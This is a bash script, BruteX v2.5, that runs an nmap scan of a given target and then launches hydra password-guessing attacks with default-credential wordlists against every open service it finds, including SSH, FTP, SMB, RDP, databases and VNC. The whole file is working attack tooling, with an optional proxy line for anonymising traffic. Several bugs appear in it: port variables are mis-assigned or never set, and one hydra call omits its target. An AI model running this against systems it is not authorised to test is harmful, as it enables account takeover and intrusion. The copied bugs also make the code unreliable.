#!/bin/bash 
# BruteX by @xer0dayz
# http://sn1persecurity.com
#
# ABOUT:
# BruteX is a simple bash script used to brute force all services on a target.
#
# INSTALL:
# ./install.sh
#
# USAGE:
# brutex <IP/hostname> <port>
#
# HYDRA SERVICES: 
# asterisk cisco cisco-enable cvs ftp ftps http[s]-{head|get} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql(v4) nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp

TARGET="$1"
PORT="$2"
VER="2.5"
LOOT_DIR=/usr/share/brutex/loot
FTP_USER_PASS="/usr/share/brutex/wordlists/ftp-default-userpass.txt"
FTP_USERS="/usr/share/brutex/wordlists/ftp_defuser.lst"
FTP_PASS="/usr/share/brutex/wordlists/ftp_defpass.lst"
SSH_USER_PASS="/usr/share/brutex/wordlists/ssh-default-userpass.txt"
SSH_USERS="/usr/share/brutex/wordlists/ssh_defuser.lst"
SSH_PASS="/usr/share/brutex/wordlists/ssh_defpass.lst"
SMTP_USERS="/usr/share/brutex/wordlists/smtp_defuser.lst"
SMTP_PASS="/usr/share/brutex/wordlists/smtp_defpass.lst"
POP_USERS="/usr/share/brutex/wordlists/pop_defuser.lst"
POP_PASS="/usr/share/brutex/wordlists/pop_defpass.lst"
TELNET_USER_PASS="/usr/share/brutex/wordlists/telnet-default-userpass.txt"
TELNET_USERS="/usr/share/brutex/wordlists/telnet_defuser.lst"
TELNET_PASS="/usr/share/brutex/wordlists/telnet_defpass.lst"
SQL_USERS="/usr/share/brutex/wordlists/sql_defuser.lst"
SQL_PASS="/usr/share/brutex/wordlists/sql_defpass.lst"
MSSQL_USER_PASS="/usr/share/brutex/wordlists/mssql-default-userpass.txt"
MYSQL_USER_PASS="/usr/share/brutex/wordlists/mysql-default-userpass.txt"
ORACLE_USER_PASS="/usr/share/brutex/wordlists/oracle-default-userpass.txt"
POSTGRES_USER_PASS="/usr/share/brutex/wordlists/postgres-default-userpass.txt"
WINDOWS_USER_LIST="/usr/share/brutex/wordlists/windows-users.txt"
WINDOWS_USER_PASS="/usr/share/brutex/wordlists/windows-default-userpass.txt"
USER_FILE="/usr/share/brutex/wordlists/simple-users.txt"
PASS_FILE="/usr/share/brutex/wordlists/password.lst"
SNMP_FILE="/usr/share/brutex/wordlists/snmp-strings.txt"
VNC_FILE="/usr/share/brutex/wordlists/vnc-default-passwords.txt"
HTTP_LOCATION="/"
THREADS="10"
COLOR1='\033[91m'
COLOR2='\033[92m'
COLOR3='\033[92m'
RESET='\e[0m'

# UN-COMMENT TO ENABLE PROXY
#export HYDRA_PROXY=socks4://127.0.0.1:9050

if [ -z $TARGET ]; then
        echo -e "$COLOR1 __________                __         ____  ___$RESET"
        echo -e "$COLOR1 \______   \_______ __ ___/  |_  ____ \   \/  /$RESET"
        echo -e "$COLOR1  |    |  _/\_  __ \  |  \   __\/ __ \ \     / $RESET"
        echo -e "$COLOR1  |    |   \ |  | \/  |  /|  | \  ___/ /     \ $RESET"
        echo -e "$COLOR1  |______  / |__|  |____/ |__|  \___  >___/\  \ $RESET"
        echo -e "$COLOR1         \/                         \/      \_/$RESET"
        echo ""
        echo -e "$COLOR1 + -- --=[ BruteX v$VER by @xer0dayz$RESET"
        echo -e "$COLOR1 + -- --=[ https://sn1persecurity.com$RESET"
        echo -e "$COLOR1 + -- --=[ Usage: brutex <target> <port>"
        echo -e "$RESET"
        exit
fi

DIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )

echo -e "$COLOR1 __________                __         ____  ___$RESET"
echo -e "$COLOR1 \______   \_______ __ ___/  |_  ____ \   \/  /$RESET"
echo -e "$COLOR1  |    |  _/\_  __ \  |  \   __\/ __ \ \     / $RESET"
echo -e "$COLOR1  |    |   \ |  | \/  |  /|  | \  ___/ /     \ $RESET"
echo -e "$COLOR1  |______  / |__|  |____/ |__|  \___  >___/\  \ $RESET"
echo -e "$COLOR1         \/                         \/      \_/$RESET"
echo ""
echo -e "$COLOR1 + -- --=[ BruteX v$VER by @xer0dayz$RESET"
echo -e "$COLOR1 + -- --=[ http://sn1persecurity.com$RESET"
echo ""
echo ""

echo -e "$COLOR3################################### Running Port Scan ##############################$RESET"
if [ -z "$PORT" ] 
then
        nmap -T4 -P0 --open $TARGET -p21,22,23,25,53,110,139,162,389,445,512,513,514,993,1433,1521,3306,3389,5432,5900,5901,8000,8080,6667 -oX $LOOT_DIR/nmap-$TARGET.xml
else
        nmap -T4 -P0 --open $TARGET -p $PORT -oX $LOOT_DIR/nmap-$TARGET.xml
fi
echo ""
echo -e "$COLOR3################################### Running Brute Force ############################$RESET"
echo ""
port_21=`grep 'portid="21"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_22=`grep 'portid="22"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_23=`grep 'portid="23"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_25=`grep 'portid="25"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_80=`grep 'portid="80"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_110=`grep 'portid="110"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_139=`grep 'portid="139"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_162=`grep 'portid="162"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_389=`grep 'portid="389"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_443=`grep 'portid="443"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_445=`grep 'portid="445"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_512=`grep 'portid="512"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_513=`grep 'portid="513"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_512=`grep 'portid="514"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_993=`grep 'portid="993"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_1433=`grep 'portid="1433"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_1521=`grep 'portid="1521"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_3306=`grep 'portid="3306"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_3389=`grep 'portid="3389"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_5432=`grep 'portid="5432"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_5900=`grep 'portid="5900"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_5901=`grep 'portid="5901"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_6667=`grep 'portid="6667"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_8000=`grep 'portid="8000"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap-$TARGET.xml | grep open`

if [ -z "$port_21" ]
then
        echo -e "$COLOR1 + -- --=[ Port 21 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 21 opened... running tests...$RESET"        
        hydra -C $FTP_USER_PASS $TARGET ftp -t $THREADS
        hydra -L $FTP_USERS -P $FTP_PASS $TARGET ftp -t $THREADS
fi

if [ -z "$port_22" ]
then
        echo -e "$COLOR1 + -- --=[ Port 22 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 22 opened... running tests...$RESET"
        hydra -C $SSH_USER_PASS $TARGET ssh -t 4
        #hydra -L $USER_FILE -P $PASS_FILE $TARGET ssh -t $THREADS
        #hydra -L $SSH_USERS -P $SSH_PASS $TARGET ssh -t $THREADS
fi

if [ -z "$port_23" ]
then
        echo -e "$COLOR1 + -- --=[ Port 23 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 23 opened... running tests...$RESET"
        hydra -C $TELNET_USER_PASS $TARGET telnet -t $THREADS
        hydra -L $USER_FILE -P $PASS_FILE $TARGET telnet -t $THREADS
        hydra -L $TELNET_USERS -P $TELNET_PASS $TARGET telnet -t $THREADS
fi

if [ -z "$port_25" ]
then
        echo -e "$COLOR1 + -- --=[ Port 25 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 25 opened... running tests...$RESET"
        hydra -L $USER_FILE -P $PASS_FILE $TARGET smtp-enum -t $THREADS
        hydra -L $USER_FILE -P $PASS_FILE $TARGET smtp -t $THREADS
        hydra -L $SMTP_USERS -P $SMTP_PASS $TARGET smtp -t $THREADS
fi

if [ -z "$port_110" ]
then
        echo -e "$COLOR1 + -- --=[ Port 110 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 110 opened... running tests...$RESET"
        hydra -L $USER_FILE -P $PASS_FILE $TARGET pop3 -t $THREADS
        hydra -L $POP_USERS -P $POP_PASS $TARGET pop3 -t $THREADS
fi

if [ -z "$port_139" ]
then
        echo -e "$COLOR1 + -- --=[ Port 139 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 139 opened... running tests...$RESET"
        hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET smb -S 139 -t $THREADS
fi

if [ -z "$port_162" ]
then
        echo -e "$COLOR1 + -- --=[ Port 162 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 162 opened... running tests...$RESET"
        hydra -P $SNMP_FILE snmp -S 162 -t $THREADS
fi

if [ -z "$port_389" ]
then
        echo -e "$COLOR1 + -- --=[ Port 389 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 389 opened... running tests...$RESET"
        hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET ldap2 -S 389 -t $THREADS
        hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET ldap3 -S 389 -t $THREADS
fi

if [ -z "$port_445" ]
then
        echo -e "$COLOR1 + -- --=[ Port 445 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 445 opened... running tests...$RESET"
        hydra -C $WINDOWS_USER_PASS $TARGET smb -S 445 -t $THREADS
        hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET smb -S 445 -t $THREADS
fi

if [ -z "$port_512" ]
then
        echo -e "$COLOR1 + -- --=[ Port 512 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 512 opened... running tests...$RESET"
        hydra -L $USER_FILE -P $PASS_FILE $TARGET rexec -S 512 -t $THREADS
fi

if [ -z "$port_513" ]
then
        echo -e "$COLOR1 + -- --=[ Port 513 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 513 opened... running tests...$RESET"
        hydra -L $USER_FILE -P $PASS_FILE $TARGET rlogin -S 513 -t $THREADS
fi

if [ -z "$port_514" ]
then
        echo -e "$COLOR1 + -- --=[ Port 514 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 514 opened... running tests...$RESET"
        hydra -L $USER_FILE -P $PASS_FILE $TARGET rsh -S 514 -t $THREADS
fi

if [ -z "$port_993" ]
then
        echo -e "$COLOR1 + -- --=[ Port 993 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 993 opened... running tests...$RESET"
        hydra -L $USER_FILE -P $PASS_FILE $TARGET imap -S 993 -t $THREADS
fi

if [ -z "$port_1433" ]
then
        echo -e "$COLOR1 + -- --=[ Port 1433 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 1433 opened... running tests...$RESET"
        hydra -C $MSSQL_USER_PASS $TARGET mssql -S 1433 -t $THREADS
        hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET mssql -S 1433 -t $THREADS
fi

if [ -z "$port_1521" ]
then
        echo -e "$COLOR1 + -- --=[ Port 1521 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 1521 opened... running tests...$RESET"
        hydra -C $ORACLE_USER_PASS $TARGET oracle -S 1521 -t $THREADS
fi

if [ -z "$port_3306" ]
then
        echo -e "$COLOR1 + -- --=[ Port 3306 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 3306 opened... running tests...$RESET"
        hydra -C $MYSQL_USER_PASS $TARGET mysql -t $THREADS
        hydra -L $SQL_USERS -P $SQL_PASS $TARGET mysql -t $THREADS
fi

if [ -z "$port_3389" ]
then
        echo -e "$COLOR1 + -- --=[ Port 3389 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 3389 opened... running tests...$RESET"
        hydra -C $WINDOWS_USER_PASS $TARGET rdp -t $THREADS
        hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET rdp -t $THREADS
fi

if [ -z "$port_5432" ]
then
        echo -e "$COLOR1 + -- --=[ Port 5432 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 5432 opened... running tests...$RESET"
        hydra -C $POSTGRES_USER_PASS $TARGET postgres -t $THREADS
fi

if [ -z "$port_5900" ]
then
        echo -e "$COLOR1 + -- --=[ Port 5900 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 5900 opened... running tests...$RESET"
        hydra -P $VNC_FILE $TARGET vnc -S 5900 -t $THREADS
        hydra -P $PASS_FILE $TARGET vnc -S 5900 -t $THREADS
fi

if [ -z "$port_5901" ]
then
        echo -e "$COLOR1 + -- --=[ Port 5901 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 5901 opened... running tests...$RESET"
        hydra -P $VNC_FILE $TARGET vnc -S 5901 -t $THREADS
        hydra -P $PASS_FILE $TARGET vnc -S 5901 -t $THREADS
fi

if [ -z "$port_6667" ]
then
        echo -e "$COLOR1 + -- --=[ Port 6667 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 6667 opened... running tests...$RESET"
        hydra -L $USER_FILE -P $PASS_FILE $TARGET irc -s 6667 -t $THREADS
fi

if [ -z "$port_8000" ]
then
        echo -e "$COLOR1 + -- --=[ Port 8000 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 8000 opened... running tests...$RESET"
        hydra -L $USER_FILE -P $PASS_FILE $TARGET http-head -s 8000 -f -q -t $THREADS -m /
fi

if [ -z "$port_8080" ]
then
        echo -e "$COLOR1 + -- --=[ Port 8080 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 8080 opened... running tests...$RESET"
        hydra -L $USER_FILE -P $PASS_FILE $TARGET http-head -S 8080 -f -q -t $THREADS -m /
fi

if [ -z "$port_8100" ]
then
        echo -e "$COLOR1 + -- --=[ Port 8100 closed... skipping.$RESET"
else
        echo -e "$COLOR2 + -- --=[ Port 8100 opened... running tests...$RESET"
        hydra -L $USER_FILE -P $PASS_FILE $TARGET http-head -S 8100 -f -q -t $THREADS -m /
fi

echo ""
echo -e "$COLOR3################################### Done! ###########################################$RESET"
exit 0
